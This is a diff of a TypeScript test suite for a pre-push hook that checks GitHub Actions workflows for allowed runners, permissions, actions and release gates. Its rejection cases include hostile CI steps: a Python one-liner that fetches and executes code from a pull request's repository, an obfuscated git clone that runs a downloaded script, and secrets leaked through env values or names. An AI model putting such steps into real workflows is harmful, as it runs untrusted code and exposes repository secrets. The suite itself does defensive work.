@@ -55,6 +55,23 @@ function workflow(job: unknown = baseJob, on: unknown = { push: null }) {
   return JSON.stringify({ on, jobs: { ci: job } });
 }
 
+const screenshotPermissions = {
+  contents: "read",
+  issues: "read",
+  "pull-requests": "read",
+  checks: "write",
+};
+
+function screenshotWorkflow(patch: Record<string, unknown> = {}) {
+  return JSON.stringify({
+    on: { pull_request: null },
+    jobs: {
+      ci: baseJob,
+      "screenshot-gate": { ...baseJob, permissions: screenshotPermissions, ...patch },
+    },
+  });
+}
+
 function fixture(
   options: {
     node?: boolean;
@@ -221,6 +238,67 @@ describe("goat pre-push workflow guard", () => {
     ]);
   });
 
+  it("allows the screenshot job alongside ci with scoped Checks API permission", () => {
+    const f = fixture({ workflow: screenshotWorkflow() });
+    expect(f.hook(f.record(f.sha)).status).toBe(0);
+  });
+
+  it("allows the scope and result jobs on the pinned hosted image or EPYC, nothing else", () => {
+    const jobs = { scope: baseJob, ci: baseJob, result: baseJob };
+    const allowed = fixture({ workflow: JSON.stringify({ on: { pull_request: null }, jobs }) });
+    expect(allowed.hook(allowed.record(allowed.sha)).status).toBe(0);
+    const pinned = fixture({
+      workflow: JSON.stringify({
+        on: { pull_request: null },
+        jobs: { ...jobs, scope: { ...baseJob, "runs-on": "ubuntu-24.04" } },
+      }),
+    });
+    expect(pinned.hook(pinned.record(pinned.sha)).status).toBe(0);
+    const hosted = fixture({
+      workflow: JSON.stringify({
+        on: { pull_request: null },
+        jobs: { ...jobs, scope: { ...baseJob, "runs-on": "ubuntu-latest" } },
+      }),
+    });
+    const refused = hosted.hook(hosted.record(hosted.sha));
+    expect(refused.status).not.toBe(0);
+    expect(refused.stderr).toContain(
+      "jobs.scope.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
+    );
+  });
+
+  it.each([
+    ["hosted runner", { "runs-on": "ubuntu-latest" }, "jobs.screenshot-gate.runs-on"],
+    [
+      "unapproved action",
+      { steps: [{ uses: "actions/checkout@v5" }] },
+      "uses is not an allowed action",
+    ],
+    [
+      "reusable job",
+      { uses: "org/repo/.github/workflows/ci.yml@main" },
+      "jobs.screenshot-gate.uses is forbidden",
+    ],
+    ["container", { container: "node:24" }, "jobs.screenshot-gate.container"],
+    ["services", { services: {} }, "jobs.screenshot-gate.container"],
+    ["missing permissions", { permissions: undefined }, "jobs.screenshot-gate.permissions"],
+    [
+      "extra write permission",
+      { permissions: { ...screenshotPermissions, contents: "write" } },
+      "jobs.screenshot-gate.permissions",
+    ],
+    [
+      "extra scope",
+      { permissions: { ...screenshotPermissions, actions: "read" } },
+      "jobs.screenshot-gate.permissions",
+    ],
+  ])("rejects a screenshot job with %s", (_name, patch, message) => {
+    const f = fixture({ workflow: screenshotWorkflow(patch) });
+    const result = f.hook(f.record(f.sha));
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain(message);
+  });
+
   it("allows deletion-only pushes without node, yaml or gh", () => {
     const f = fixture({ node: false, gh: false, yaml: "missing" });
     const result = f.hook(f.record(zero, "(delete)", f.sha));
@@ -252,7 +330,7 @@ describe("goat pre-push workflow guard", () => {
     const result = f.hook(f.record(f.sha), {}, ["origin", "git@github.com:Goat-Si/Goat.git"]);
     expect(result.status).toBe(1);
     expect(result.stderr).toBe(
-      `goat pre-push: ${workflowPath} in refs/heads/test (${f.sha}): jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`,
+      `goat pre-push: ${workflowPath} in refs/heads/test (${f.sha}): jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`,
     );
     expect(f.ghCalls()).toBe(1);
   });
@@ -263,11 +341,7 @@ describe("goat pre-push workflow guard", () => {
       "all allowed actions",
       workflow({
         ...baseJob,
-        steps: [
-          { uses: "actions/checkout@v6" },
-          { uses: "voidzero-dev/setup-vp@v1" },
-          { uses: "actions/upload-artifact@v4" },
-        ],
+        steps: [{ uses: "actions/checkout@v6" }, { uses: "voidzero-dev/setup-vp@v1" }],
       }),
     ],
     [
@@ -381,7 +455,7 @@ describe("goat pre-push workflow guard", () => {
     );
     expect(result.status).toBe(1);
     expect(result.stderr).toBe(
-      `goat pre-push: ${workflowPath} in refs/heads/bad (${unchangedBad}): jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`,
+      `goat pre-push: ${workflowPath} in refs/heads/bad (${unchangedBad}): jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`,
     );
     expect(bad).not.toBe(unchangedBad);
     expect(f.ghCalls()).toBe(1);
@@ -391,7 +465,7 @@ describe("goat pre-push workflow guard", () => {
     [
       "hosted runner",
       workflow({ ...baseJob, "runs-on": "ubuntu-latest" }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "hosted runner with quoted runs-on and tagged on keys",
@@ -399,7 +473,7 @@ describe("goat pre-push workflow guard", () => {
         .replace("on:", "!!str on:")
         .replace("runs-on:", '"runs-on":')
         .replace("[self-hosted, linux, x64, goat, epyc]", "ubuntu-latest"),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "disallowed trigger with tagged on key",
@@ -425,13 +499,17 @@ describe("goat pre-push workflow guard", () => {
     [
       "extra job",
       JSON.stringify({ on: { push: null }, jobs: { ci: baseJob, extra: baseJob } }),
-      "jobs must contain exactly ci",
+      "jobs must contain ci and optionally scope, screenshot-gate, result",
     ],
-    ["missing jobs", JSON.stringify({ on: { push: null } }), "jobs must contain exactly ci"],
+    [
+      "missing jobs",
+      JSON.stringify({ on: { push: null } }),
+      "jobs must contain ci and optionally scope, screenshot-gate, result",
+    ],
     [
       "jobs array",
       JSON.stringify({ on: { push: null }, jobs: [] }),
-      "jobs must contain exactly ci",
+      "jobs must contain ci and optionally scope, screenshot-gate, result",
     ],
     ["nonmapping ci", workflow(null), "jobs.ci must be a mapping"],
     [
@@ -482,17 +560,17 @@ describe("goat pre-push workflow guard", () => {
     [
       "duplicate labels",
       workflow({ ...baseJob, "runs-on": ["self-hosted", "linux", "x64", "goat", "goat"] }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "missing labels",
       workflow({ ...baseJob, "runs-on": runnerLabels.slice(1) }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "extra label",
       workflow({ ...baseJob, "runs-on": [...runnerLabels, "ubuntu-latest"] }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "nonliteral label",
@@ -500,12 +578,12 @@ describe("goat pre-push workflow guard", () => {
         ...baseJob,
         "runs-on": ["self-hosted", "linux", "x64", "goat", "${{ inputs.runner }}"],
       }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "nonstring label",
       workflow({ ...baseJob, "runs-on": ["self-hosted", "linux", "x64", "goat", 42] }),
-      "jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc",
+      "jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc",
     ],
     [
       "empty steps",
@@ -603,7 +681,7 @@ describe("goat pre-push workflow guard", () => {
       expect(result.status).toBe(1);
       expect(result.stderr).toBe(
         mode === "hosted runner"
-          ? `goat pre-push: ${workflowPath} in refs/heads/test (${bad}): jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`
+          ? `goat pre-push: ${workflowPath} in refs/heads/test (${bad}): jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc; refusing to push\n${advice}\n`
           : `goat pre-push: ${extraPath} in refs/heads/test is not disabled on goat-si/goat\n${advice}\n`,
       );
       expect(f.ghCalls()).toBe(1);
@@ -672,7 +750,7 @@ exit 1
     );
     expect(rejected.status).not.toBe(0);
     expect(rejected.stderr).toContain(
-      `goat pre-push: ${workflowPath} in HEAD (${bad}): jobs.ci.runs-on must contain exactly self-hosted, linux, x64, goat, epyc; refusing to push`,
+      `goat pre-push: ${workflowPath} in HEAD (${bad}): jobs.ci.runs-on must be ubuntu-24.04 or exactly self-hosted, linux, x64, goat, epyc; refusing to push`,
     );
     const absent = NodeChildProcess.spawnSync(
       gitExecutable,
@@ -686,7 +764,7 @@ exit 1
 
 const nightlyPath = ".github/workflows/goat-nightly.yml";
 const prepareGateText =
-  "github.repository == 'goat-si/goat' && (github.event_name == 'workflow_dispatch' || (github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'push' && github.event.workflow_run.head_branch == 'dev' && github.event.workflow_run.head_repository.full_name == 'goat-si/goat'))";
+  "github.repository == 'goat-si/goat' && (github.event_name == 'workflow_dispatch' || (vars.GOAT_RELEASES_PUBLISH == 'true' && github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'workflow_dispatch' && github.event.workflow_run.display_title == 'goat-ci all on dev' && github.event.workflow_run.head_branch == 'dev' && github.event.workflow_run.head_repository.full_name == 'goat-si/goat'))";
 const downstreamGateText =
   "needs.prepare.result == 'success' && needs.prepare.outputs.skip == 'false'";
 const macRunner = ["self-hosted", "macOS", "ARM64", "goat", "mac-studio"];
@@ -784,6 +862,22 @@ describe("goat pre-push nightly workflow guard", () => {
     expect(result.status).toBe(0);
   });
 
+  it("allows contents: write on jobs that use the staging hand-off", () => {
+    const jobs = nightlyJobs();
+    jobs.build_mac = { ...jobs.build_mac, permissions: { contents: "write" } };
+    jobs.publish = { ...jobs.publish, permissions: { contents: "write" } };
+    jobs.cleanup = {
+      needs: ["prepare", "publish"],
+      if: `${downstreamGateText} && (always())`,
+      "runs-on": "ubuntu-24.04",
+      permissions: { contents: "write" },
+      steps: [checkout(), { run: "node scripts/nightly-staging.ts cleanup" }],
+    };
+    const result = push(nightly(jobs));
+    expect(result.stderr).toBe("");
+    expect(result.status).toBe(0);
+  });
+
   it("allows the shipped nightly workflow", () => {
     const shipped = NodePath.join(sourceRoot, nightlyPath);
     if (!NodeFS.existsSync(shipped)) return;
@@ -848,14 +942,27 @@ describe("goat pre-push nightly workflow guard", () => {
     [
       "a gate that accepts pull request runs",
       withJob("prepare", {
-        if: prepareGateText.replace(" && github.event.workflow_run.event == 'push'", ""),
+        if: prepareGateText.replace(
+          " && github.event.workflow_run.event == 'workflow_dispatch'",
+          "",
+        ),
       }),
-      "jobs.prepare.if must be the dev-push gate",
+      "jobs.prepare.if must be the manual dev run gate",
+    ],
+    [
+      "a gate that accepts a partial manual lane",
+      withJob("prepare", {
+        if: prepareGateText.replace(
+          " && github.event.workflow_run.display_title == 'goat-ci all on dev'",
+          "",
+        ),
+      }),
+      "jobs.prepare.if must be the manual dev run gate",
     ],
     [
       "a missing gate",
       withJob("prepare", { if: undefined }),
-      "jobs.prepare.if must be the dev-push gate",
+      "jobs.prepare.if must be the manual dev run gate",
     ],
     [
       "a job without needs: prepare",
@@ -1026,14 +1133,189 @@ describe("goat pre-push nightly workflow guard", () => {
       "must check out ${{ needs.prepare.outputs.sha }} with persist-credentials: false",
     ],
     [
-      "write permissions",
-      withJob("publish", { permissions: { contents: "write" } }),
-      "jobs.publish must not request write permissions",
+      "write permissions beyond contents",
+      withJob("publish", { permissions: { contents: "write", actions: "write" } }),
+      "jobs.publish may only request contents: write",
+    ],
+    [
+      "write-all permissions",
+      withJob("build_mac", { permissions: "write-all" }),
+      "jobs.build_mac may only request contents: write",
+    ],
+    [
+      "a non-contents write permission",
+      withJob("build_other", { permissions: { packages: "write" } }),
+      "jobs.build_other may only request contents: write",
+    ],
+    [
+      "write permissions on prepare",
+      withJob("prepare", { permissions: { contents: "write" } }),
+      "jobs.prepare must not request write permissions",
+    ],
+    [
+      "an Actions artifact upload",
+      withJob("build_mac", { steps: [checkout(), { uses: "actions/upload-artifact@v4" }] }),
+      "jobs.build_mac step 1.uses is not an allowed action",
+    ],
+    [
+      "an Actions artifact download",
+      withJob("build_other", { steps: [{ uses: "actions/download-artifact@v4" }] }),
+      "jobs.build_other step 0.uses is not an allowed action",
     ],
   ])("refuses %s", (_name, content, reason) => {
     const result = push(content);
     expect(result.status).toBe(1);
     expect(result.stderr).toContain(`goat pre-push: ${nightlyPath} in refs/heads/test (`);
+    expect(result.stderr).toContain(reason);
+  });
+});
+
+const closeOutsidePrsPath = ".github/workflows/close-outside-prs.yml";
+
+describe("goat pre-push close-outside-prs workflow guard", () => {
+  const shippedSource = NodeFS.readFileSync(NodePath.join(sourceRoot, closeOutsidePrsPath), "utf8");
+  const yaml = NodeModule.createRequire(import.meta.url)(yamlSource) as {
+    parse: (source: string) => Record<string, any>;
+  };
+  function shipped() {
+    return yaml.parse(shippedSource);
+  }
+  function push(content: string) {
+    const f = fixture();
+    f.write(closeOutsidePrsPath, content);
+    const sha = f.commit();
+    return f.hook(f.record(sha));
+  }
+  function patched(edit: (workflow: Record<string, any>) => void) {
+    const workflow = shipped();
+    edit(workflow);
+    return JSON.stringify(workflow);
+  }
+
+  it("allows the shipped workflow while it stays active on GitHub", () => {
+    const result = push(shippedSource);
+    expect(result.stderr).toBe("");
+    expect(result.status).toBe(0);
+  });
+
+  it.each([
+    [
+      "a pull_request trigger",
+      patched((w) => {
+        w.on.pull_request = null;
+      }),
+      "on must be exactly pull_request_target with types [opened, reopened]",
+    ],
+    [
+      "a synchronize event",
+      patched((w) => {
+        w.on.pull_request_target.types.push("synchronize");
+      }),
+      "on must be exactly pull_request_target with types [opened, reopened]",
+    ],
+    [
+      "contents: write",
+      patched((w) => {
+        w.permissions.contents = "write";
+      }),
+      "permissions must be exactly pull-requests: write",
+    ],
+    [
+      "a checkout step",
+      patched((w) => {
+        w.jobs.close.steps.unshift({ uses: "actions/checkout@v6" });
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a step that checks out the pull request",
+      patched((w) => {
+        w.jobs.close.steps.unshift({ run: 'gh pr checkout "$PR_NUMBER"' });
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "an expression in the script",
+      patched((w) => {
+        w.jobs.close.steps[0].run += "\necho ${{ github.event.pull_request.title }}";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "the pull request head in env",
+      patched((w) => {
+        w.jobs.close.steps[0].env.HEAD = "${{ github.event.pull_request.head.sha }}";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a secret in env",
+      patched((w) => {
+        w.jobs.close.steps[0].env.GH_TOKEN = "${{ secrets.GOAT_RELEASES_TOKEN }}";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a job without the same-repository exemption",
+      patched((w) => {
+        w.jobs.close.if = "github.event.pull_request.author_association != 'OWNER'";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a self-hosted runner",
+      patched((w) => {
+        w.jobs.close["runs-on"] = runnerLabels;
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a script that downloads and runs code from the pull request",
+      patched((w) => {
+        w.jobs.close.steps[0].run =
+          "python3 -c \"import json,os,urllib.request as u;e=json.load(open(os.environ['GITHUB_EVENT_PATH']));exec(u.urlopen(e['pull_request']['head']['repo']['html_url']).read())\"";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a quoted git clone",
+      patched((w) => {
+        w.jobs.close.steps[0].run = 'g"it" clone "$GH_REPO" pr && sh pr/run.sh';
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "a secret in a step name",
+      patched((w) => {
+        w.jobs.close.steps[0].name = "${{ startsWith(secrets.PRIVATE_KEY, 'a') }}";
+      }),
+      "jobs.close must match the reviewed job; review it and update the pinned hash",
+    ],
+    [
+      "an expression in the workflow name",
+      patched((w) => {
+        w.name = "${{ secrets.PRIVATE_KEY }}";
+      }),
+      "name must not contain expressions",
+    ],
+    [
+      "a second job",
+      patched((w) => {
+        w.jobs.build = w.jobs.close;
+      }),
+      "jobs must be exactly close",
+    ],
+    [
+      "workflow-level env",
+      patched((w) => {
+        w.env = { FOO: "bar" };
+      }),
+      "only name, on, permissions and jobs are allowed at the workflow level",
+    ],
+  ])("refuses %s", (_name, content, reason) => {
+    const result = push(content);
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain(`goat pre-push: ${closeOutsidePrsPath} in refs/heads/test (`);
     expect(result.stderr).toContain(reason);
   });
 });
